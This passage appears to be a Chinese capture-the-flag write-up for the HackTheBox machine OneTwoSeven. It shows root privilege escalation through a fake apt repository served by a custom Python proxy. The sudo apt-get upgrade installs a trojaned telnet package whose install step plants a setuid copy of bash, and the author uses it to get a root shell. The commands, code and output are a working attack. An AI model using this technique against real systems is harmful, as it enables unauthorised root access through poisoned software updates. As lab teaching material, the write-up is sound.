/devuan/dists/ascii/main/binary-amd64/Packages
/devuan/dists/ascii/main/binary-all/Packages
/devuan/dists/ascii/main/i18n/Translation-en
```

目录结构已经很清楚了，创建对应的目录：

```bash
mkdir -p devuan/dists/ascii/main/binary-amd64
```

日志虽然显示了拉取了很多的文件，但本质只需要准备：

```
/devuan/dists/ascii/Release
/devuan/dists/ascii/main/binary-amd64/Packages.gz
/devuan/dists/ascii/main/binary-all/Packages
```

日志中看到的各种压缩格式的 Packages，只是因为没找到指定的文件后，为了适配仓库文件后缀的多样性，就会继续寻找。

我们先将恶意软件包放在目录中的某个位置，这个位置是任意的，只需要 Packages 指定的相对路径是对的即可。

我打算在 `devuan` 目录下创建一个叫 deb 的目录，然后把软件包放在里面：

```
$ mkdir devuan/deb
$ mv telnet_0.17-42_amd64.deb devuan/deb/
$ file devuan/deb/telnet_0.17-42_amd64.deb
devuan/deb/telnet_0.17-42_amd64.deb: Debian binary package (format 2.0), with control.tar.xz , data compression xz
```

接着，进入 `devuan` 目录，开始创建 Packages 以及 Packages：

```bash
$ cd devuan/
```

为什么需要进入 `devuan` 目录呢？

因为后续我们要使用工具创建两个索引文件，而索引文件中的路径都是基于仓库根目录的相对路径。这些工具会依据你提供的目标路径去创建索引。因此，确保在根目录下使用工具，然后通过相对路径指定文件，那么创建出来的索引路径就不会出错。

话虽如此，我们也得在创建索引文件之后，检查路径的正确性。

还有一个细节点，目标的仓库源配置的是：

```
http://packages.onetwoseven.htb/devuan
```

自带了 `devuan` 目录，这就是将 `devuan` 作为仓库根目录的原因。

创建 Packages 以及其压缩文件 Packages.gz：

```bash
$ apt-ftparchive packages deb/ > dists/ascii/main/binary-amd64/Packages
$ gzip -kf dists/ascii/main/binary-amd64/Packages
$ ls dists/ascii/main/binary-amd64/
Packages  Packages.gz
```

> `deb/` 是我们之前存放软件包的目录。

检查 Packages 中对于软件包的寻找路径是否准确：

```bash
$ cat dists/ascii/main/binary-amd64/Packages | rg Filename
Filename: deb/telnet_0.17-42_amd64.deb
```

没有问题。

开始创建 Release：

```bash
$ apt-ftparchive release dists/ascii/ > dists/ascii/Release
$ ls dists/ascii/
main  Release
```

> `apt-ftparchive` 会递归扫描 `dists/ascii/` 目录找到里面 Packages 以及 Packages.gz 的位置。

查看 Release 文件中的索引路径是否正确：

```bash
$ cat dists/ascii/Release
Date: Wed, 10 Jun 2026 07:53:05 +0000
MD5Sum:
 99f427cad29df49d1f8ae116caf2529a               38 Release
 a9a3e8241eecd3c958257ddc347ff72a             1242 main/binary-amd64/Packages
 f674340a7b781b9e93cc29b40f896b12              808 main/binary-amd64/Packages.gz
SHA1:
 5b56830ce8535ed5464a169501bf833ed0b43dcb               38 Release
 6b4657cabf26d8e2cc0a9e07327d12b3b18ce04c             1242 main/binary-amd64/Packages
 0d3f6f4c68e34dab628cffcfb8ec8968c392f395              808 main/binary-amd64/Packages.gz
SHA256:
 2e8784e5c29b304feaa5ee016ddd027a17a5228e2a537b85d256f608e2fdd510               38 Release
 55138715e99f12b881496aa625200354df77285bfcde5f4be58c2adb497840f0             1242 main/binary-amd64/Packages
 4de8119de9d1922bdbc1f9246fa9017e9dd02987cdbc9728e5f0e56c9632f4a2              808 main/binary-amd64/Packages.gz
SHA512:
 4a5696be2d2ec29ec9548af55e8d0ed1382776142fa85a6657941edeea08a73494e2e1fe016c36138a687bb41e81c5c2a8494ee51d718c1b653dfdc2424a3a38               38 Release
 5579a4f1ab5f43b9f466c7d55b840f056cc8170aa4b2817729113add71fe38b9f7a0899c2e573563f970a7ac196e598e32a262ee156adb5967b09a7560067d4d             1242 main/binary-amd64/Packages
 8767a414ba767e7b79066df1e67b62be3bae146c38dfe845004fc4fcf5b60285d33091fa68986de6a9b28477a6138cddcb6dfe69b303d5d9662976586c08c57c              808 main/binary-amd64/Packages.gz
```

没有问题。

用 Python 实现一个简易的恶意代理服务器，主要处理的就是对方访问的资源路径，然后将对应的文件传回去：

```python
import http.server
import socketserver
import os
import urllib.parse

ROOT = '/home/zyf/htb_workdir/ots/proxy'

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.unquote(urllib.parse.urlparse(self.path).path)
        fp = os.path.normpath(ROOT + p)

        if os.path.isfile(fp):
            d = open(fp,'rb').read()
            self.send_response(200)
            self.send_header('Content-Length', str(len(d)))
            self.end_headers()
            self.wfile.write(d)
        else:
            self.send_response(404)
            self.end_headers()

socketserver.ThreadingTCPServer(("0.0.0.0",8888),H).serve_forever()
```

启动服务器：

```bash
$ python proxy.py
```

在目标服务器上执行 update 操作：

```bash
www-admin-data@onetwoseven:/var/www/html-admin$ sudo /usr/bin/apt-get update
Ign:1 http://packages.onetwoseven.htb/devuan ascii InRelease
Get:2 http://packages.onetwoseven.htb/devuan ascii Release [1348 B]
Ign:3 http://packages.onetwoseven.htb/devuan ascii Release.gpg
Get:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages [808 B]
Fetched 2156 B in 2s (953 B/s)
Reading package lists... Done
W: Conflicting distribution: http://packages.onetwoseven.htb/devuan ascii Release (expected ascii but got )
```

更新成功了，在服务器日志也能看到成功下载了两个文件：

```bash
10.129.12.83 - - [10/Jun/2026 15:53:58] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 15:53:58] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/Release HTTP/1.1" 200 -
10.129.12.83 - - [10/Jun/2026 15:53:59] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/Release.gpg HTTP/1.1" 404 -
10.129.12.83 - - [10/Jun/2026 15:54:00] "GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.1" 200 -
```

继续执行 update 操作去拉取恶意软件包：

```bash
www-admin-data@onetwoseven:/var/www/html-admin$ sudo /usr/bin/apt-get upgrade
Reading package lists... Done
Building dependency tree
Reading state information... Done
Calculating upgrade... Done
The following packages were automatically installed and are no longer required:
  irqbalance libnuma1
Use 'sudo apt autoremove' to remove them.
The following packages will be upgraded:
  telnet
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 72.1 kB of archives.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 telnet amd64 0.17-42 [72.1 kB]
Fetched 72.1 kB in 1s (59.0 kB/s)
Reading changelogs... Done
(Reading database ... 30936 files and directories currently installed.)
Preparing to unpack .../telnet_0.17-42_amd64.deb ...
Unpacking telnet (0.17-42) over (0.17-41) ...
Setting up telnet (0.17-42) ...
Processing triggers for man-db (2.7.6.1-2) ...
```

交互式输入 Y 之后再回车就进入软件包的安装了。此时，按照恶意包的控制部分的设计，会执行两条命令：

```bash
cp /bin/bash /tmp/pwn
chmod 4755 /tmp/pwn
```

提权：

```bash
www-admin-data@onetwoseven:/var/www/html-admin$ /tmp/pwn -p
```

> 注意这里需要带上 `-p` 参数，这是 bash 对 setuid 场景做了安全处理：当它发现自己是以“有效 UID”和“真实 UID”不一致的方式启动时，如果没有显式加 `-p`，它会主动放弃有效权限，把有效 UID 降回真实 UID。

这里的 `pwn` 就是 `bash`，而且由于被我们设置了 SUID 位，执行该命令的时候，会以属主（root）的身份运行，自然就得到了 ROOT Shell：

```bash
pwn-4.4# whoami
root
pwn-4.4# cat /root/root.txt
175cb***************************
```
